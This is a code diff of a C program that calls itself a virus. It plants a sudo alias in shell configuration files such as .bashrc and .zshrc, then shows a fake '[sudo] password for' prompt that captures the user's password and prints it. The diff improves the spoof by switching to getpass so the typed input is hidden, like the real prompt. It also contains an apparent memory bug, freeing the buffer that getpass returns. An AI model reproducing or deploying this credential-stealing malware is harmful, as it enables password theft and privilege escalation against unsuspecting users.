@@ -13,24 +13,29 @@
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
 int main(int argc, char ** argv){
+
+  //set mode
   int mode = P_IMPLANT;
   for (int i = 0; i<argc; i++){
     if (strcmp(argv[i],"SUDO") == 0){
-      printf("BANG!\n");
       mode = P_SUDO;
       break;
     }
   }
 
+  //implant the alias to the virus as sudo...
   if(mode == P_IMPLANT){
     alias_virus();
   }
   
+  //fake being sudo. We know we are sudo because we recieved the sudo alias prompt
   if(mode == P_SUDO){
     char passwd[PASSWD_SIZE];
     char username[UNAME_SIZE];
 
     steal_password(passwd, username);
+
+    printf("%s's password is %s\n", username, passwd);
   }
 }
 
@@ -44,8 +49,14 @@ int get_username(char * uname){
 int steal_password(char * passwd, char * username){
   get_username(username);
 
-  printf("[sudo] password for %s: ", username);
-  fgets(passwd, PASSWD_SIZE, stdin);
+  char prompt[UNAME_SIZE + 32];
+  sprintf(prompt,"[sudo] password for %s: ", username);
+
+  char * returned_pass = getpass(prompt);
+  
+  strcpy(passwd, returned_pass);
+
+  free(returned_pass);
 
 }
 
